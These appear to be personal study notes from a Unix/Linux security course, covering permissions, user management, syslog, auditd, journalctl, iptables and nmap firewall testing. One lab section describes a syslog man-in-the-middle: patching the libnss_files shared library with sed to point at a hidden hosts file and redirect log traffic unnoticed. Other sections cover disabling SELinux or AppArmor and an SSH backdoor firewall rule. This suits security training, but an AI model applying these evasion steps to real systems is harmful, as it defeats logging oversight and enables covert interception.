getent passwd/shadow/group 
getent -s [database] [entry]
	getent -s files shadow # all shadow entires from files database 
	getent -s sss group <groupname> # group entry from sss database type via sssd service 


# EXERCISE {

	#  is the number of databases the NSS (Name Service Switch) is configured to utilize for the shadow database?
		vim /etc/nsswitch.conf 
		egrep ^shadow /ec/nsswitch.conf // or 

	# What service(s) are being used by NSS for authentication on this system via the passwd/shadow database?
		vim /etc/nsswitch.conf
		service --status-all | grep running # confirm sss, nscd, nslcd , etc.

	# how many user accounts with (UIDs within the range 500-1019) configured for interactive login to this system?
	getent passwd | egrep "[500-1200]" | grep bash | wc -l
		- check for 1. interactive shells 2. doesn't have ! (acc disable) 3. must have passwd 
	for i in $(getent passwd | tr -s ':' ' ' | awk '{ if ( $3 >= 500) if ($3 <= 1019) print $0}' | cut -d ' ' -f1); do getent shadow $i; echo; done
	}
	
} 

{ # modify ownership (chown)
# chown 
chown [newOwnerName] [FileName]
chown -R [newOwnerName:newOwnerGroup] [Filename] # recursive 

# chgrp 
chgrp newOwnerGroup Filename 
	chgrp -R newOwnerGroup Filename # recursive 

}

{ # modify access permission (chmod), default access perms (umask)
-- remember: owner > group > other permissions 
	e.g. owner with read supercedes being in a group that cant 
		 owner without read perms CANT read a file, even if its group/world readable 

# chmod symbolic-mode 
chmod symbolic-mode-list filename 
	e.g. 
		chmod u+rw,g=x,go-wx /tmp/script # add rw to user, group set to execute, remove write/exeute from group and global 
		chmod u+rw,g=,o=u /tmp/text # add rw perm to user, set no perm for group, other (global) set to user perms 
			u=user,g=group,o=other 
			can use full or comma separated strings for each class/perm assignment: e.g. ugo=rwx 
			a = all groups 
			can set permissions to same as another class e.g. o=u # other (global) perms set same as user
		+ // add perms 
		- // remove perms 
		= // set perms 


# chmod absolute-mode 
chmod absolute-mode filename 
	4 (read) 2 (write) 1 (execute) 0 (no-access) 
	chmod 660 file.sh / -rw-rw---- 
	chmod 764 file.sh / -rwxrw-r-- 
		# disadvantages vs symbolic: MUST set all class perms every command use 

# umask - set permission removed from the default permissions on new files/dirs 
	- default UNIX dir = 777, file = 666
	umask 022 # remove w perm from group and other 
		dir = 777
			 -022 = 755 -rwxr-xr-x 
	umask u=rwx,go=rx # remove rwx from user created, rx from group/other 

}


{ # manually edit users/groups (no useradd)
	#1. create staff group, GUID 501 + stooges 502 
	vim /etc/group  
	echo "staff:x:501:" >> /etc/group
	echo "stooges:x:502:" >> /etc/group

	#2. add account into for fred 
	vim /etc/passwd # Modify the appropriate file to add user fred to your system with the smallest available UID for fred. Set the GECOS field to Fred Flintstone, fred's home directory to /home/freddo, and fred's default shell to /bin/bash. What does the line you entered look like?
		// check /etc/login.defs for minimum UID for new user accounts) 
	echo "fred:x:501:501:Fred Flinstone:/home/freddo:/bin/bash" >> /etc/passwd

	#3. add fred to stooges group
	vim /etc/groups 
	stooges:x:502:fred

	#4. modify /etc/shadow - so fred has no passwd (use default again info)
	fred:*:16301:0:99999:7:::

	#5. set fred passwd 
	passwd fred

	#6. copy skeleton home to /home/freddo // (contains bash logout,profile,rc - used by useradd) 
	cp -r /etc/skel /home/freddo

	#6.7 log into fred 
	su - fred 
		# NEED - to load env. variables!

	#7. change ownership of /home/freddo to user fred and group staff 
	chown -R fred:staff /home/freddo
		chgrp -R staff /home/freddo

	#8. set stooges group to - NO password  - default again info 
	vim /etc/gshadow
		stooges:x::
		
	#9. set stooges group password 
	gpasswd stooges 

	#10. make fred an administrator of stooges group 
	gpasswd -A fred stooges 
		#bonus. root user/group admin add user to the group 
			gpasswd -a <user> <groupname> 

}

{ # Special permissions (chmod)
	------ Symbolic Mode ------
	# SUID/GUID
	chmod u+s filename 
	chmod g+s filename 
	chmod ug+s filename # enable SUID + GUID 

	#stickybit - deletion restriction flag
	chmod o+t filename 
	chmod +t filename 

	------ Absolute Mode ------
	chmod [#]6640 file 
		4 - SUID 
		2 - GUID 
		1 - Stickybit 


}

{ # Access Control - DACL (user-user basis), MAC (security labels/attributes), RBAC (role based rights)

# getfacl
getfacl [file/dir] # displays ownership/perms 

# setfacl 


}


{ # EXERCISES 2 

	{ # Unix Ownership and Permissions 1 ]
	# 1. add a user with login name john, home directory /home/john, default shell /bin/csh, and primary group staff.
	useradd john -d /home/john -s /bin/csh -g staff 
	
		# 1.5 go to freds homedir 
		cd ~fred 
	
	# 3. change ownership of script to have owner fred and group staff 
	chown fred:staff helloscript.sh
	
	# 4. Using absolute-mode syntax, change the permissions of helloscript.sh so that the permissions string rwxr-x---
	chmod 750 helloscript.sh
	
	# 5. change ownership fo helloprog to have group staff, retain root owner 
	chown :staff helloprog 
		chown root helloprog # or
		chgrp staff helloprog 
		
	# 6. switch from root to fred w/o changing environment 
	su fred 
		su - fred # adopt freds environment/scripts
		
	# 7. use symbolic-mode to change helloscript.sh perms so group read perms are removed 
	chmod g-r helloscript.sh 
	
	}
	
	{ # Unix Ownership and Permissions 2 ]
	#1. single command: add 5 users on your machine: larry, moe, shemp, curly, and joe. TMake sure all the users have the stooges group as primary group. Use any password you want for each user (using stooger)
	useradd -g stooges -p $(openssl passwd -1 stooger) larry && 
 	useradd -g stooges -p $(openssl passwd -1 stooger) moe &&
	useradd -g stooges -p $(openssl passwd -1 stooger) shemp &&
	useradd -g stooges -p $(openssl passwd -1 stooger) curly &&
	useradd -g stooges -p $(openssl passwd -1 stooger) joe
	
	for user in larry moe shemp curly joe; do useradd $user -s /bin/bash -d /home/$user -g stooges; passwd $user; done
	// script note 
		- can create list on the fly 
		- multiple executions seperated by ; after the do UNTIL ;done
	
	#2. single command: create /stooge dir and subdirectories larry, moe, shemp, curly, joe 
	mkdir -p /stooge/larry /stooge/moe /stooge/shemp /stooge/curly /stooge/joe
		mkdir /stooge /stooge/larry /stooge/moe /stooge/shemp /stooge/curly /stooge/joe; cd /stooge.
	
	#3. single command, change the ownership settings so that larry, moe, shemp, curly, and joe each have ownership of their eponymous subdirectory inside /stooge
	chown larry larry && chown moe moe && chown shemp shemp && chown curly curly && chown joe joe 
		for user in larry moe shemp curly joe; do chown $user /stooge/$user; done 
	
	#4. Change ownership of the /stooge directory so it and all of its contents are owned by the stooges group
	chown -R :stooges /stooge 
		chgrp -R stooges /stooge
	
	#5. remove curly and his homedir 
	userdel -r curly 
	
	#6. disable shemp user account - no login prompt 
	sudo usermod -s /bin/false shemp
		sudo usermod --shell /bin/false shemp
	sudo usermod -s /bin/nologin shemp # nologin prints 'account unavailable'
	
	#7. add symbolic read+write for stooge group in /stooge dir
	chmod g+rw /stooge/
	
	#8. add stickybit to /stooge directory 
	chmod +t /stooge
	
	}

	{ # REQUIRED PERMS FOR DIR/FILE ACCESS 
	read 
		To be able to read a file, a user account will need access to the directory with the execute permission. The user account will also need to have read permission on the file.
	
	modify
		To be able to modify a file, a user account will need access to the directory with the execute permission. The user account will also need to have write permission on the file.
	
	create
		To create files, the user account will need write and execute permissions on the directory. Execute will allow the account to perform actions within the directory and write will allow the user to create a new pointer in the data of the directory for the new file. Additionally, if the SGID bit is set the newly created file or directory will inherit the group of the parent directory.
			(parent as in its new directory)
		
	list files in dir 
		To list only the file names in the directory a user account will need read permissions on the directory. However, they will not be able to see any metadata about the files. To list the files and metadata in a directory, a user account will need read and execute permissions on the directory. Execute will allow the account to perform actions within the directory and read allow the user the read the pointers that make up the data of the directory.
	
	delete files
		To delete files, the user account will need write and execute permissions on the directory. Execute will allow the account to perform actions within the directory and write will allow the user to delete the pointer in the data of the directory for the file regardless of the permissions of the file. If the sticky bit (T) is set, only the user that owns the file will be able to delete file. The user account will still need to have the required permissions to remove the file or directory.
	
	execute script 
		To execute a script, a user account will need execute on the directory and file as well as read on the file. Execute on the directory will allow the account to perform actions within the directory. Execute on the file will allow the account to execute the file. Since scripts are treated as a text file in Unix, the user account will also need to be able to read the file.
	
	execute binary 
		Which user accounts can execute the binary teal? In your own words explain why.
	}


}




}
 
{ ``` 2.2 Logging ``` 

{ # Basic Commands 

	ausearch # query audit daemon logs 
	journalctl # query journal log entries (system(d) logging - kmsg, system logs, audit records from kernel, services)
	last # show last login times /var/log/wtmp || solaris = /var/adm/wtmpx 
	lastb # show failed logins log /var/log/btmp 
	logger # interface to syslog system log module - make entries in system log 
	logrotate # rotate/compress/mails system logs 

	lsof # list open files -- linux 
		lsof -p [procPID]
	pfiles # fstat/fcntl info for all OPEN files in each PROCESS --- solaris  
	
	setstatus # view selinux running configuration  
	getenforce # only show the selinux mode 
	setenforce # modify SELinux nide 
		setenforce 1 (enforcing) or 0 (permissive)
		to disable: must modify /etc/selinux/config && init 6 - or kernel param @ boot

	logadm # log rotation tool - solaris 
	
	ausearch # view audit logs (better than read flat log)
	aureport # display summary report of audit logs 
	auditctl -l # list rules 
	
	# package managers 
	rpm, yum # RHEL/CentOS 
	dpkg, apt, apt-get # Debian 
	pkgadd,pkgchk,pkginfo,pkgrm # Solaris/ Unix

}

{ # MISC log notes (format, grep)
	# typical log format 
	[timestamp] [hostname/IP] [application/proc] [message]
	
	
	{ # SEVERITY / (facility) priority LEVELS 
		emerg 0
		alert 1
		crit 2
		err	3
		warning 4
		notice 5
		info 6
		debug 7
	
	}

	# which logging daemon is running?
	ps -ef | grep syslog 

	# passwd logs 
	grep passwd /var/log/secure 

	# passwd logs on date 
	grep passwd /var/log/secure | grep "Nov 17"

	# filter OUT log entries ...
	grep -v "192.168." /var/log/secure 
		
}

{ # JOURNALCTL - required to read journal (binary file)

# review conf (storage mode/enabled) 
cat /etc/systemd/journald.conf 

# filter using trad. syslog severity (priority) levels (e.g. emerg, alert, info, etc.)
journalctl -p 
	journalctl -p 2..0
	journalctl -p crit..emerg


# filter msgs since/until time : YYYY-MM-DD HH:MM:SS 
journalctl --since 
journalctl --until 2023-01-22 13:11:41
	if seconds/ HMS omitted - assumes 0 
	if YYYY-MM-DD omitted - assumes TODAY 
	# or strings 
	journalctl --since today, tomorrow, yesterday, now 
	journalctl --until today, tomorrow, yesterday, now 
	# or relative times 
	
# filter based on service unit 
journalctl -u

# check if systemd-journald / journald is logging to disk - on RHEL 7
	vim /etc/systemd/journald.conf 
	journalctl --header 
ls /var/log/journal <-----------------------------
	- IF EXISTS == PERSISTENT 

# view journal entries for crond 
journalctl -u crond 

# view netmon journal entries - TODAY and LAST 2 hours 
journalctl -u NetworkManger --since today 
journalctl -u NetworkManger --since '2 hours ago' 
journalctl -u NetworkManger --since '2h' 

# display system3 journal msgs with CRIT severity or higher
journalctl -p crit
	journalctl -p 2..0
	journalctl -p crit..emerg


}

{ # SYSTEM LOGGING exercise 1

# view log config 
cat /etc/syslog.conf 

# enable syslog server to receive msgs from remote systems - linux (centOS)
vim /etc/sysconfig/syslog 
	add syslogd_options to -r 
	or
		sed -i "s/SYSLOGD_OPTIONS=\"-m 0"\"SYSLOGD_OPTIONS=\"-m 0 -r\"/g" /etc/sysconfig/syslog 
		
	# make sure to restart syslog service on receiving server - if enabled remote logging
	service syslog restart 

# configure rhel7 to be syslog server and receive messages from remote systems 
vim /etc/rsyslog.conf 
	uncomment UDP/TCP 2 syslog reception lines (defines vars)
	# restart service
	systemctl restart rsyslog
	
# configure a device to be a remote logging host 
	// e.g. if messages being sent to @loghost in /etc/syslog.conf e.g. ifdef('LOGHOST', /var/log/syslog, @loghost)
vim /etc/hosts 
	[IP] [hostname] loghost
	// remove loghost from other users if it's there 
	
	
# send solaris log to remote host (auth.notice if configured in syslog.conf) 
	 logger -p auth.notice tst msg
	
	# make sure to restart syslog service on sending server!
	svcadm restart system-log 
	
# find reboot entires (solaris)
grep boot /var/adm/* 
	grep "SunOS Release 5.10" /var/adm/messages | grep Oct | wc -l.

# find console logins 
grep -i console /var/adm/* /var/log/*

# view software install logs (centOS)
cat /var/log/yum.log

# identify num of packages installed on August 19
grep 'Aug 19' /var/log/yum.log | grep Installed | wc -l


}

{ # AUDIT DAEMON exercise 2 

# view JUST pid of auditd 
ps -C auditd 

# user login records 
last /wtmp of (unix or solaris)
	last -f /var/log/wtmp.1 # specify rotated file 
lastb /btmp 

	{ # lsof: FD column 
	cwd - the current working directory of the process
	txt - the executable associated with the process
	mem - file mapped to the process's memory space
	a number - the file descriptor which the process uses to refer to the file. The letter following the number indicates the file open mode (r = read only, w = write only, u = both read and write, W - file open with write permission and with write lock on the file)

	The contents of the TYPE column indicate the type of file identified in the right-most column, which is often:
	REG - regular file
	DIR - directory
	FIFO - FIFO special file
	CHR - character special file
	}
 


}

{ # LONG RECORDS & AUDIT CONFIG exercise 3 

# check if wtmp/utmp is logging (solaris)
svcs -a | grep utmp
svcs utmp

# determine date/timestamp of first event in /var/log/audit/audt.log 
head -n 1 /var/log/audit/audit.log 
	ausearch -p 9105
	ausearch -p 9105 -i # human readable / date 
		or even 
		 ausearch --just-one 

# display audit events related to passwd executable 
ausearch -x passwd

# display summary of audit logs 
aureport 

# add in /etc/audit/audit.rules to monitor write/attribute changes in /etc 
-w /etc/ -p wa
	-w = where, -p = permissions 

# view active audit rules / current active rulest 
auditctl -l 

{ # enable STIG recommended audit rules in /usr/share/doc/audit-<version>/stig.rules to operation 
	1.	Copy the rules from the documentation directory and replace the current auditd rules by running cp /usr/share/doc/audit-<version> /stig.rules /etc/audit/audit.rules.
	2.	Verify you are running a 32 bit operating system by executing uname -i. A 32 bit system returns "i386" or "i686". A 64 bit system returns "x86_64".
	3.	Since you are using a 32 bit system you need to remove the 64 bit rules and include all the 32 bit rules. You can run two single line sed scripts to do this: sed -i -e '/b64/ s/^/#/' /etc/audit/audit.rules to comment out the b64 rules and sed -i -e '/b32/ s/^#//' /etc/audit/audit.rules to uncomment all the commented b32 lines.
	4.	Restart the auditd service to load the new rules.
	5.	The command to list and count the auditd rules is auditctl -l | wc -l.
}

# ubuntu - apparmor status // view enforcing profiles/procs
	aa-enabled / aa-status 
# disable 
	add GRUB_CMDLINE_LINUX_DEFAULT="apparmor=0" to /etc/default/grub. Afterwards, update the grub.cfg with update-grub and reboot the host.

# change aa status 
	aa-enforce  # set profile to enforce afte service restarts 
	aa-parser # read profile into kernel ( no need to restart service )

}


{ # Syslog MITM Exercise 
# on target host - MITM p1
	
	vim /etc/syslog.conf # confirm remote logging? 

	# check audit settings 
	auditctl -l  # check rules 
		cat /etc/audit/audit.rules 
		vim /etc/syslog.conf # any audit rules?
		
	# check if auditd is logging to syslog (many ways, this most secure) 
	vim /etc/audisp/plugins.d/syslog.conf # active=yes means write events to syslog

	# cant modify /etc/syslog.conf without being logged... how else to obatin syslog messages?
		- man nsswitch.conf shows a shared object that implements the "files" source == /lib/libnss_files.so.X 
			# ^^^ link to "/lib/libnss_files-2.5.so", and it contains a link to use "/etc/hosts" 
			/lib/libnss_dns.so.X --- for DNS server resolution. unnecessary here 

# intercept host - MITM p2 
	1. prep to capture syslog messages from linux.ops.local and send to ftp.ops.local # MITM! 
		vim /etc/rsyslog.conf # uncomment $ModLoad imudp and $UDPServerRun514 
		service rsyslog restart 
	
	2. modify rsyslog to ONLY send syslog from "linux.ops.local" to ftp.ops.local
		{ vim /etc/rsyslogd.conf 
			//my slightly bugged way 
				# if $hostname == 'linux.ops.local' and $programname == 'syslog' then @ftp.ops.local:514 & stop
			// rec. way !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				if $fromhost == 'linux.ops.local' then { *.* @ftp.ops.local }
		}
		service rsyslog restart
		
# back on target - MITM part 3 
	1. patch nsswitch.conf (/etc/hosts).so file to use a FILE of my choosing
		touch /var/.host # must contain same num of chars in hosts filename AND is outside of /etc/
		cp /etc/hosts /var/.host 
	2. replace /etc/hosts with /var/.host in the .so file 
		sed -i -e 's/\/etc\/hosts/\/var\/.host/g' /lib/libnss_files-2.5.so
	3. vim /var/.host # add redir line 
		192.168.11.15	ftp.ops.local
		
	4. load the udpated configuration 
		service syslog restart
		
	5. verify by generating syslogs  /  tcpdumps
		logger testmessage
}

# takaways from MITM exercise 
	- if one method is monitored (e.g. /etc/ modifications), there could be other ways to subvert e.g. modify links/shared objects 
	- can 'patch' the text in a .so # in this case, replace the /etc/hosts with false /var/.host
		used sed 
	- for remote logging in /etc/syslog.conf or rsyslog.conf 
		@server.name = UDP
		@@server.name = TCP
		server.name = depends? could be TCP 
	- can use rainscript syntax to set specific logic/rules for logging .confs .e.g forwarding based on vars

{ # LogSearch Exercise 
// = feedback

#1. search for files in system with SMS_ in name 
locate SMS_
find / -name "SMS_*" -type f # remember the "" !
	//find / -name "SMS_*" | wc -l. wc -l

#2. find all files w/ extension .png in /root/Corvus and subdirs 
find /root/Corvus -type f -name "*.png"

#3. how many are .png actually?
for i in `find /root/Corvus -type f -name "*.png"`; do file $i; done | grep PNG 
	//find /root/Corvus -name "*.png" -exec file {} \;.

#4. python executables in /root/Arvala-7 and subdirs 
find /root/Arvala-7 -type f -name "*.py"
	- no files have .py .... 
for i in `ls -d /root/Arvala-7/*`; do file $i; done | grep Python
	//find /root/Corvus -exec file {} \; | grep PNG
	
#5. find files between 2 timestamp of file1 and file 2
stat [file1] [file2]
find / -newermt "2016-08-14 22:53:04"  ! -newermt "2016-08-24 22:53:04"
	- newermt # -newerXY == timestamp reference
				a = access time
				B = birth time
				c = inode status change time 
				m = moidifcation time 
				t = reference interpreted directly as time 
	//find /root/Arvala-7 -type f -exec file {} \; | grep "Python"
	//for i in $(find /root/Arvala-7 -type f); do file $i | grep Python; done. wc -l
				
#6. now by access time
find / -newerat "2016-08-14 22:53:04"  ! -newerat "2016-08-24 22:53:04"
	// find / -type f -newermt "YYYY-MM-DD" ! -newermt "YYYY-MM-DD"
	// find / -type f -newer /root/file1 ! -newer /root/file2

#7. find files older than 30 days and delete them 
for i in $(find /root/metrics -type f -mtime +30); do rm -f $i; done  
	// find / -type f -newerat "YYYY-MM-DD" ! -newerat "YYYY-MM-DD"
	// find / -type f -anewer /root/file1 ! -anewer /root/file2.
	
#8. find files in /root/metrics older than 30 days and delete them
for i in $(find /root/metrics -type f -mtime +30); do rm -f $i; done  
	// find /root/metrics -mtime +30 -exec rm {} \;
	
#9. find files in /root/Sorgan with "grogu" string
find /root/Sorgan -type f -maxdepth 1 -exec grep "grogu" {} \;
	# grep -l grogu /root/Sorgan/*. 

#10. find files in /root/Sorgan and subdirectories with "grogu" string
find /root/Sorgan -type f -exec grep "grogu" {} \;
	
#11. find files created or modified by user Ahsoka durings its most recent session ************
1. find most recent session 
	last Ahsoka 
	//last -F

2. find created/modified files 
find / -type f -newermt "2021-04-12 10:46" ! -newermt "2021-04-13 06:18"
	// find -type f -newermt "" ! -newermt ""
	// find -type f -newer /root/file1 ! -newer /root/file2
	
#12. Identify the number of unique IP addresses in the HTTP log /var/log/access_log that requested the page /child.
grep "/child " /var/log/access_log | cut -d " " -f1 | sort -u # added space - some request have childd
	// grep "/child " /var/log/access_log | awk {'print $1'} | sort | uniq
	
#13. Using the file /var/log/access_log, within which hour was the page /darksaber accessed the most?
grep "darksaber" /var/log/access_log | awk '{print $4}' | awk -F: '{print $2}'
	// also can grep "darksaber" /var/log/access_log - and visually inspect 

#14. Using the file /var/log/access_log, which unique IP accessed the page /jedi the most?
grep "/jedi " /var/log/access_log | cut -d " " -f1 | sort -u
	// grep "/jedi " /var/log/access_log | awk {'print $1'} | sort | uniq

#15. Using the file /var/log/access_log, how many pages can be seen being served by the webserver?
cat /var/log/access_log | awk '{print $7}' | sort -u
	// awk {'print $7'} /var/log/access_log | sort | uniq.
	
	
#16. Using the file /var/log/access_log, identify the IP address that uses multiple useragent strings.
for i in `grep "/child " /var/log/access_log | cut -d " " -f1 | sort -u`; do grep $i /var/log/access_log | awk '{print $13,$14,$15,$16,$17,$18,$19,$20,$21,$22,$23,$24}' | sort -u | wc -l ; echo $i; done | less
	// for i in $(awk {'print $1'} /var/log/access_log | sort | uniq); do echo $i && grep $i /var/log/access_log | awk -F\" {'print $5'}; done

#17. Using only the file /var/log/iptables.log, identify which source IP address(es) shows up the most in the log?
cat /var/log/iptables.log | awk '{print $12}' | sort 
	// awk {'print $12'} /var/log/iptables.log | sort | uniq -c

#18. Using only the file /var/log/iptables.log and the IP address(es) from the previous question, how many logs contain that IP address and is between the second and third hour of the log?
grep "61.26.27.156" -rl /
	// determine the time parameters by reviewing the log. After determining the second hour, searching Either search by IP address and determine which, if any, logs fall within that hour or search by time and isolate the specific IP address(es). Tailoring search parameters with egrep.
		- 1. determine the 2nd/3rd hour of the log?
		- 2. find files with IP and isolate by hour 
			or search files by time and isolate IPs 

#19. Using only the file /var/log/iptables.log, identify the IP that has the most ssh attempts.
grep "SSH Port: IN" /var/log/iptables.log | awk '{print $12}' | sort
	// grep "DST=22" /var/log/iptables.log | cut -d' ' -f12 | sort | uniq -c' # SSH IN or DST PORT 
#20. Using only the file /var/log/iptables.log, identify the IP address that is potentially using MAC address spoofing. What command(s) did you use? How many MAC addresses and which MAC addresses has the IP address used?
for i in `grep "SSH Port: IN" /var/log/iptables.log | awk '{print $12}' | sort -u`; do grep $i /var/log/iptables.log | awk '{print $11}' | sort -u | wc -l; echo $i; done
	// for i in $(awk {'print $12'} /var/log/iptables.log | sort | uniq); do echo $i && grep $i /var/log/iptables.log | cut -d' ' -f11 | sort | uniq; done

} 



}

{ ``` 2.3 Security Mechanisms ``` 

{ # basic commands 
iptables # Linux. stateful inspection + NAT  
	iptables -nv -L # verbose list all tables: raw -> mangle -> nat -> filter 
nftables # successor to iptables 
firewall-cmd #  cli for firewalld daemon // redhat/fedora mostly 
sunscreen/ ipf # Solaris (old / new). Stateful + NAT + VPN termination  
}

{ # iptables 

	iptables [options] [action] [matching rules] [target]
	
	iptables -t [TABLE] -A [CHAIN] [RULES] -j [TARGET]
		-L // view rules and chains 
			-v // verbose, statistics with each rule 
			-n // numeric (no dns res)
			--line-numbers // rule numbers 
		-m [state] --state [STATE1,STATE2] -j [ACTION]
		-t [table] // FILTER, NAT, MANGLE, etc. 
		
		-A --append – Add a rule to a chain (at the end).
		-R --replace a rule in the selected chain
		-I --insert – Add a rule to a chain at a given position.
		-F --flush – Remove all rules.

		-C --check – Look for a rule that matches the chain’s requirements.
		-D --delete – Remove specified rules from a chain.
		-N -new-chain – Create a new chain.
		-v --verbose – Show more information when using a list option.
		-X --delete-chain – Delete the provided chain.
	
	# also check IPv6 (for port related info)
	ip6tables -L -n -v 
	
	{ # CHAINS 
		# filter 
		INPUT = if received packet dst is iptables host, processes
		FORWARD = if received packet dst is not host, sent to routing table 
		OUTPUT = for packets generated from iptables host 
		# nat 
		PREROUTING = change the dst IP of traffic coming in (e.g. pub ip -> local ip when communicating FROM internet)
			-dnat  
		OUTPUT
			-snat (for packets from iptables host) 
		POSTROUTING  = change the src IP of traffic going on (e.g. local ip-> pub ip when communicating TO internet)
			-snat (for packets transiting iptable host) 
	}

	# persistent rule config file
	/etc/sysconfig/iptables
	
	# list rules 
	iptables -L -n -v | less # filter table rules (-t filter = default), all CHAINS by default 

	iptables -L -t NAT -n -v # NAT table rules, verbose, numeric mode 
		
	# Add (-A), Insert (-I), Replace (-R), delete (-D)
		rule/policy modification takes chain name e.g. -A INPUT // -A FORWARD 
		
	# set default policy (-P) in case matches no rules
	
	# stateful matching 
	iptabes -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT
	
	# filter targets 
	-j ACCEPT // packet passes firewall and STOPS going through chain (unless already in other chains)
		DROP // blocked. (nmap reports closed)
		REJECT // ^ but also sends back error to host (blocked) aka filtered
		LOG // bug hunting/error finding. does not affect packet chain, still continues through
		CHAIN // continue process packet in current user defined chain 
		RETURN // stop traversing chain, resume @ next rule in previous calling chain 
		
	# NAT targets 
	-j SNAT // rewrite src IP address in IP header (usually in OUTPUT + POSTROUTING chains) 
		DNAT // rewrite dst IP in IP header (usually in PREROUTING chain)
		MASQUERADE // Port address translation - rewrite source IP/Port for outbound packets (usually OUTPUT/POSTROUTE)
			- source becomes firewall IP 
			- source port used to track originating host
	
	# Flushing Firewall rules 
	iptables -t filter -F # flush all filter rules 
	iptables -t nat -F 
	iptables -X # remove all user defined chains from filter table 
	iptables -P INPUT ACCEPT # set default policy for INPUT chain of filter table 
	iptables -P OUTPUT ACCEPT
	iptables -P FORWARD ACCEPT
	
	# REVIEW 
	iptables -t [TABLE] -A [CHAIN] [RULES] -j [TARGET] # using a ! negates the element
	iptables -t filter -A FORWARD -s 192.168.0.0/24 -d 192.168.1.0/24 -i eth0 -o eth1 -j ACCEPT
		#^ filter table, 
		
	# allow loopback
	iptables -A INPUT -i lo -j ACCEPT 
	iptables -A OUTPUT -o lo -j ACCEPT 
	
	# RULE - restrict access to firewall's SSH port to hosts on subnet 10.18.80.64/26 // assume default is to drop
	iptables -t filter -A INPUT -s 10.18.80.64/26 -p tcp --dport 22 -j ACCEPT
	iptables -t filter -A OUTPUT -d 10.18.80.64/26 -p tcp --sport 22 -j ACCEPT # must be paired IOT return SSH connection
	
	# STATEFUL RULE - only accept new or existing conns
	iptables -t filter -A INPUT -s 10.18.80.64/26 -p tcp --dport 22 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
	iptables -t filter -A OUTPUT -d 10.18.80.64/26 -p tcp --sport 22 -m state --state ESTABLISHED,RELATED -j ACCEPT
		# firewall should not be establishing new conns out
		
	# REMOVE a rule 
}

{ # Testing Firewall Rules Ex. (NMAP / tcpdump)
#tcp port scan
nmap -n -Pn -sS -p<port> <host>

#udp scan
nmap -n -Pn -sU -p<port> <host>

# stateful firewall test 
nmap -n -Pn -sA -p<port> <host> # if DOESN'T respond to ACK with a RST (just drops), using stateful

# monitor responses to nmap scans (determine firewall state)
tcpdump -n -v dst [myIP] and src [tgtIP] 


}

	``` ! revisit this one ``` 
{ # Writing Firewall Rules Ex. 
1. rules allow you to maintain or re-establish your SSH connection to the firewall from only your linux.ops.local machine
sudo iptables -t filter -A INPUT -s 192.168.11.13 -p tcp --dport 22 -j ACCEPT &&
sudo iptables -t filter -A OUTPUT -d 192.168.11.13 -p tcp --sport 22 -j ACCEPT 
	# filter used by default 
	
2. rules for firewall to communicate with its loopback 
sudo iptables -A INPUT -i lo -j ACCEPT &&
sudo iptables -A OUTPUT -o lo -j ACCEPT 

3. allow incoming Established or Related connections on all interfaces
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT 
	// DONT NEED OUTPUT = for outgoing

4. allow the 2 ops nets to communicate to each other freely 
sudo iptables -A FORWARD -s 192.168.11.0/24 -d 192.168.111.112/29 -j ACCEPT &&
sudo iptables -A FORWARD -d 192.168.11.0/24 -s 192.168.111.112/29 -j ACCEPT
	# or 
	sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT
	sudo iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT

5. assure firewall can reach external DNS server
	// previous state rule covers this // sudo iptables -t filter -A INPUT -d 192.168.11.254 -p udp --dport 53 -j ACCEPT &&
				sudo iptables -A INPUT -s 192.0.2.2 -p udp --dport 53 -j ACCEPT &&
				sudo iptables -A OUTPUT -d 192.0.2.2 -p tcp --dport 53 -j ACCEPT 
				sudo iptables -D OUTPUT -d 192.0.2.2 -p tcp --dport 53 -j ACCEPT
sudo iptables -A OUTPUT -d 192.0.2.2 -p udp --dport 53 -j ACCEPT 
	confirm with: @192.0.2.2 ras.fatdeer.lab

6. allow hosts inside the OPS network to access port 53 on the firewall (since serves as name server for OPS network)
	# allow all DNS within network; do NOT allow DNS to/from internet 
sudo iptables -A INPUT \! -i eth2 -p udp --dport 53 -j ACCEPT &&
sudo iptables -A OUTPUT \! -o eth2 -p udp --sport 53 -j ACCEPT
	# or this 
	sudo iptables -t filter -A INPUT -p udp --dport 53 -s 192.168.11.0/24 -j ACCEPT &&
	sudo iptables -t filter -A OUTPUT -p udp --sport 53 -d 192.168.11.0/24 -j ACCEPT


7. block all other traffic 
sudo iptables -P INPUT DROP &&
sudo iptables -P FORWARD DROP &&
sudo iptables -P OUTPUT DROP 
	# or
	sudo iptables -D INPUT -j DROP &&
	sudo iptables -D FORWARD -j DROP &&
	sudo iptables -D OUTPUT -j DROP

8. write NAT rules to perform 1-to-1 network address translation for ftp.ops.local (192.168.111.116) to the address 198.51.100.116

# in vs out public-private IP address NAT
sudo iptables -t nat -A PREROUTING -d 198.51.100.116 -i eth2 -j DNAT --to-destination 192.168.111.116 && 
sudo iptables -t nat -A POSTROUTING -s 192.168.111.116 -o eth2 -j SNAT --to-source 198.51.100.116

	``` serious troubles conceptualizing this. 198.51 IS MY EXTERNAL IP. Dont think of it as a remote IP. just in/out rules make way more sense e.g. PREROUTE: ping 192.51? so ping .116  // POSTROUTE curl internet website? change src from .116 to public .51 so it gets NATd on the way back ```

8.5 allow icmp ping to and from ftp.ops.local 
sudo iptables -A FORWARD -d 192.168.111.116 -p icmp -j ACCEPT &&
sudo iptables -A FORWARD -s 192.168.111.116 -p icmp -j ACCEPT


9. allow machines on the outside to connect into it via (natd) FTP
sudo iptables -A FORWARD -i eth2 -p tcp --dport 21 -d 192.168.111.116 -j ACCEPT 
	# forwarding ftp traffic coming from eth2 (internet) to 192.168.111.116
	
10. create most narrow rules to allow external SSH backdoor into linux.ops.local
sudo iptables -t nat -A POSTROUTING -s 192.168.11.13 -o eth2 -j MASQUERADE
	# nat so becomes IP of eth2 (public IP)
	
sudo iptables -A FORWARD -s 192.168.11.13 -d ras.fatdeer.lab -p tcp --dport 22 -j ACCEPT &&
sudo iptables -A FORWARD -d 192.168.11.13 -s ras.fatdeer.lab -m state --state ESTABLISHED,RELATED -j ACCEPT

11. allow so remote users can get into FTP (only allowed established/related to come IN, not go out) 
sudo iptables -A FORWARD -s 192.168.111.116 -p tcp --sport 21 -m state --state ESTABLISHED,RELATED -j ACCEPT  

12. Clean firewall rules 
sudo iptables -t filter -F &&
sudo iptables -t nat -F &&
sudo iptables -X &&
